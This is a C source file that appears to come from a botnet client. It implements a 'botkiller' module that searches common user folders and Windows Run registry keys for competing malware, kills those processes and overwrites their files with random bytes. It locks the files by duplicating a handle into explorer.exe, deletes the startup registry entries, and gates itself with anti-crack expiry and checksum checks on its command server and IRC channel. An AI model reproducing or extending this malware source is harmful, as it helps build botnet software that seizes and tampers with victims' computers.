#include "../Includes/includes.h"

#ifdef INCLUDE_BOTKILL
bool CreateRestrictingZoneIdentifier(LPTSTR cFilePath)
{
    bool bReturn = FALSE;

    char cZoneIdentifierContents[DEFAULT];
    strcpy(cZoneIdentifierContents, "[ZoneTransfer]\nZoneId=4\n");

    char cZoneIdentifierPath[MAX_PATH];
    strcpy(cZoneIdentifierPath, cFilePath);
    strcat(cZoneIdentifierPath, cZoneIdentifierSuffix);

    if(FileExists(cZoneIdentifierPath))
        DeleteFile(cZoneIdentifierPath);

    FILE * fFile;
    fFile = fopen(cZoneIdentifierPath, "w");
    if(fFile != NULL)
    {
        fputs(cZoneIdentifierContents, fFile);
        fclose(fFile);

        bReturn = TRUE;
    }

    return bReturn;
}

bool BreakFile(LPTSTR cFilePath)
{
    bool bReturn = TRUE;

    SetFilePrivileges(cFilePath, FILE_ALL_ACCESS, FALSE);
    SetFileNormal(cFilePath);

    //--
    char cWriteThroughFilename[strlen(cFilePath) + 25];
    memset(cWriteThroughFilename, 0, sizeof(cWriteThroughFilename));
    strcpy(cWriteThroughFilename, cFilePath);
    strcat(cWriteThroughFilename, ".");
    strcat(cWriteThroughFilename, GenRandLCText());
    MoveFileEx(cFilePath, cWriteThroughFilename, MOVEFILE_WRITE_THROUGH);

    MoveFileEx(cWriteThroughFilename, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    MoveFileEx(cFilePath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
    //--

    //--
    HANDLE hFile = CreateFile(cFilePath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if(hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    BYTE btBreakFile[DEFAULT + DEFAULT];

    for(unsigned int ui = 0; ui < sizeof(btBreakFile); ++ui)
        btBreakFile[ui] = (rand() % 255);

    DWORD dwBytesWritten = NULL;
    WriteFile(hFile, &btBreakFile, sizeof(btBreakFile), &dwBytesWritten, NULL);
    //--

    //--
    HANDLE hExplorerProcess = NULL;

    HWND hwndExplorer = FindWindow("Shell_TrayWnd", NULL);
    if(hwndExplorer != NULL)
    {
        DWORD dwExplorerPid = NULL;
        GetWindowThreadProcessId(hwndExplorer, &dwExplorerPid);

        hExplorerProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, dwExplorerPid);
        if(hExplorerProcess == NULL)
            return FALSE;
    }

    HANDLE hRemoteFile = NULL;
    DuplicateHandle(GetCurrentProcess(), hFile, hExplorerProcess, &hRemoteFile, NULL, FALSE, DUPLICATE_SAME_ACCESS);
    CloseHandle(hExplorerProcess);
    //--

    CreateRestrictingZoneIdentifier(cFilePath);
    SetFilePrivileges(cFilePath, FILE_ALL_ACCESS, TRUE);

    return bReturn;
}

void ScanDirectoryForBots(const char *cDirectory, bool bRecurse)
{
    WIN32_FIND_DATA d32;
    HANDLE hFindFiles = FindFirstFile(cDirectory, &d32);

    if(GetLastError() == ERROR_FILE_NOT_FOUND || hFindFiles == INVALID_HANDLE_VALUE)
        return;

    do
    {
        if(!strstr(".", d32.cFileName) && !strstr("..", d32.cFileName) && (strstr(d32.cFileName, ".com") || strstr(d32.cFileName, ".exe") || strstr(d32.cFileName, ".scr") || strstr(d32.cFileName, ".vbs") || strstr(d32.cFileName, ".cmd")))
        {
            char cSearchHandler[MAX_PATH];
            memset(cSearchHandler, 0, sizeof(cSearchHandler));

            memcpy(cSearchHandler, cDirectory, strlen(cDirectory) - 1);
            strcat(cSearchHandler, d32.cFileName);

            if(DirectoryExists(cSearchHandler))
            {
                strcat(cSearchHandler, "\\*");

                if(bRecurse)
                    ScanDirectoryForBots(cSearchHandler, TRUE);
                else
                    ScanDirectoryForBots(cSearchHandler, FALSE);
            }
            else
            {
                if((!strstr(cSearchHandler, cFileSaved)) && (!strstr(cSearchHandler, cThisFile)) && IsFileSystemOrHidden(cSearchHandler) && strstr(cSearchHandler, ":\\"))
                {
                    DWORD dwPid = GetPidFromFilename(d32.cFileName);

                    if(dwPid != 0)
                    {
                        if(KillProcessByPid(dwPid, TRUE))
                        {
                            dwKilledProcesses++;

#ifdef DEBUG
                            printf("BK: Killed Process: %s (PID: %ld)\n", d32.cFileName, dwPid);
#endif
                        }
                    }

                    if(BreakFile(cSearchHandler))
                    {
                        dwFileChanges++;

#ifdef DEBUG
                        printf("BK: Disabled File: %s\n", cSearchHandler);
#endif
                    }
                }
            }
        }
    }
    while(FindNextFile(hFindFiles, &d32) != 0);

    FindClose(hFindFiles);

    return;
}

void ScanDirectoriesForBots() //looks for files with suspicious attributes in common bot storage directories
{
    for(unsigned short us = 0; us < 6; us++)
    {
        char cDirectory[MAX_PATH];
        memset(cDirectory, 0, sizeof(cDirectory));

        if(us == 0)
            strcpy(cDirectory, cAppData);
        else if(us == 1)
        {
            if(dwOperatingSystem > WINDOWS_XP)
            {
                strcpy(cDirectory, getenv("LOCALAPPDATA"));
                continue;
            }
        }
        else if(us == 2)
            strcpy(cDirectory, cTempDirectory);
        else if(us == 3)
            strcpy(cDirectory, cUserProfile);
        else if(us == 4)
            strcpy(cDirectory, cAllUsersProfile);
        else if(us == 5)
        {
            if(dwOperatingSystem > WINDOWS_XP)
                strcpy(cDirectory, getenv("PROGRAMDATA"));
            else
                break;
        }

        strcat(cDirectory, "\\*");

        ScanDirectoryForBots(cDirectory, TRUE);
    }

    return;
}

void ScanRegistryForBots()
{
    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
    time_t tTime;
    struct tm *ptmTime;
    tTime = time(NULL);
    ptmTime = localtime(&tTime);
    char cTodaysDate[20];
    memset(cTodaysDate, 0, sizeof(cTodaysDate));
    strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
    if(atoi(cTodaysDate) >= nExpirationDateMedian)
        return;
    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

    unsigned int uiReturn = 0;

    for(unsigned short us = 0; us < 10; us++)
    {
        char cKeyPath[MAX_PATH];
        memset(cKeyPath, 0, sizeof(cKeyPath));
        strcpy(cKeyPath, cRegistryKeyToCurrentVersion);

        if(us == 0 || us == 5)
            strcat(cKeyPath, "Run");
        else if(us == 1 || us == 6)
            strcat(cKeyPath, "RunOnce");
        else if(us == 2 || us == 8)
            strcat(cKeyPath, "Policies\\Explorer\\Run");
        else if(us == 3)
            strcpy(cKeyPath, "Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\load");
        else if(us == 4 || us == 9)
            strcat(cKeyPath, "Policies\\Explorer\\Run");
        else if(us == 7)
            strcat(cKeyPath, "RunOnceEx");

        HKEY hKey = NULL;
        if(us == 0 || us == 1 || us == 2 || us == 3 || us == 4)
            hKey = HKEY_CURRENT_USER;
        else
            hKey = HKEY_LOCAL_MACHINE;

        HKEY hkResult = NULL;

        if(hKey == HKEY_LOCAL_MACHINE)
        {
            if(IsAdmin())
                RegOpenKeyExA(hKey, cKeyPath, NULL, KEY_READ | KEY_WRITE, &hkResult);
        }
        else
            RegOpenKeyExA(hKey, cKeyPath, NULL, KEY_READ | KEY_WRITE, &hkResult);

        if(hkResult != NULL)
        {
            char cName[256];
            DWORD dwNameLen = sizeof(cName);

            char cValue[256];
            DWORD dwValueLen = sizeof(cValue);

            unsigned short usKeyNumber = 0;
            while(RegEnumValue(hkResult, usKeyNumber, cName, &dwNameLen, NULL, NULL, (PBYTE)cValue, &dwValueLen) == ERROR_SUCCESS)
            {
                if((!strstr(cValue, cFileSaved)) && (!strstr(cValue, cThisFile)) && strstr(cValue, ":\\"))
                {
                    char *pcCleanPath;
                    if(strstr(cValue, "\""))
                        pcCleanPath = FindInString(cValue, (char*)"\"", (char*)"\"");
                    else if(strstr(cValue, "\'"))
                        pcCleanPath = FindInString(cValue, (char*)"\'", (char*)"\'");
                    else
                        pcCleanPath = cValue;

                    char cFilePath[MAX_PATH];
                    strcpy(cFilePath, pcCleanPath);

                    if(strlen(pcCleanPath) > 1)
                    {
                        char *pcFileName = strstr(cFilePath, "\\") + 1;
                        while(strstr(pcFileName, "\\"))
                            pcFileName = strstr(pcFileName, "\\") + 1;

                        //char *pcFileName = GetFileNameFromFilePath(cFilePath);

                        DWORD dwPid = GetPidFromFilename(pcFileName);

                        if(dwPid > 0)
                        {
                            if(KillProcessByPid(dwPid, TRUE))
                            {
                                dwKilledProcesses++;

#ifdef DEBUG
                                printf("BK: Successfully killed Process: %s (PID: %ld)\n", pcFileName, dwPid);
#endif
                            }
                        }
                        else
                        {
#ifdef DEBUG
                            printf("BK: Failed to kill process: %s (PID: %ld)\n", pcFileName, dwPid);
#endif
                        }

                        if(BreakFile(cFilePath))
                        {
                            dwFileChanges++;

#ifdef DEBUG
                            printf("BK: Successfully disabled File: %s\n", cFilePath);
#endif
                        }
                        else
                        {
#ifdef DEBUG
                            printf("BK: Failed to disable File: %s\n", cFilePath);
#endif
                        }

                        if(DeleteRegistryKey(hKey, cKeyPath, cName))
                        {
                            dwRegistryKeyChanges++;

#ifdef DEBUG
                            if(hKey == HKEY_CURRENT_USER)
                                printf("BK: Succesfully deleted registry key: HKEY_CURRENT_USER\\%s - \"%s\"\n", cKeyPath, cName);
                            else
                                printf("BK: Succesfully deleted registry key: HKEY_LOCAL_MACHINE\\%s - \"%s\"\n", cKeyPath, cName);
#endif
                        }
                        else
                        {
#ifdef DEBUG
                            if(hKey == HKEY_CURRENT_USER)
                                printf("BK: Failed to delete registry key: HKEY_CURRENT_USER\\%s - \"%s\"\n", cKeyPath, cName);
                            else
                                printf("BK: Failed to delete registry key: HKEY_LOCAL_MACHINE\\%s - \"%s\"\n", cKeyPath, cName);
#endif
                        }
                    }
                }

                dwNameLen = sizeof(cName);
                dwValueLen = sizeof(cValue);
                usKeyNumber++;
            }

            RegFlushKey(hkResult);
            RegCloseKey(hkResult);
        }
    }
}

DWORD WINAPI Botkiller(LPVOID)
{
    bBotkill = TRUE;

    if(bBotkillOnce)
    {
        dwKilledProcessesSaved = dwKilledProcesses;
        dwFileChangesSaved = dwFileChanges;
        dwRegistryKeyChangesSaved = dwRegistryKeyChanges;
    }

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 3376+2005;
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
        bBotkill = false;
    // <!-------! CRC AREA STOP !-------!>

    while(bBotkill)
    {
        ScanDirectoriesForBots();
        ScanRegistryForBots();
        Sleep(GetRandNum(3000) + 1000);

        if(bBotkillOnce)
        {
#ifndef HTTP_BUILD
            if(bBotkillInitiatedViaCommand)
                SendBotkilledOneCycle(dwKilledProcesses - dwKilledProcessesSaved, dwFileChanges - dwFileChangesSaved, dwRegistryKeyChanges - dwRegistryKeyChangesSaved);
#endif

            bBotkill = FALSE;
            bBotkillOnce = FALSE;
        }
        // <!-------! CRC AREA START !-------!>
        char cCheckString[DEFAULT];
        sprintf(cCheckString, "%s:%i", cServer, usPort);
        char *pcStr = cCheckString;
        unsigned long ulCheck = 3376+2005;
        int nCheck;
        while((nCheck = *pcStr++))
            ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
        if(ulCheck != ulChecksum3)
            break;
        // <!-------! CRC AREA STOP !-------!>
    }

    return 1;
}

void StartBotkiller()

{
    while(TRUE)
    {
        // <!-------! CRC AREA START !-------!>
        char cCheckString[DEFAULT];
        sprintf(cCheckString, "%s(%s)", cChannel, cChannelKey);
        char *cStr = cCheckString;
        unsigned long ulCheck = ((5*(43*5))*(3+2))+(3*2);
        int nCheck;
        while((nCheck = *cStr++))
            ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;

        if(ulCheck != ulChecksum4)
            continue;
        // <!-------! CRC AREA STOP !-------!>

        HANDLE hThread = CreateThread(NULL, NULL, Botkiller, NULL, NULL, NULL);

        if(hThread)
        {
            CloseHandle(hThread);
            break;
        }

        Sleep(500);
    }
}

void StopBotkiller()
{
    bBotkill = FALSE;
}
#endif
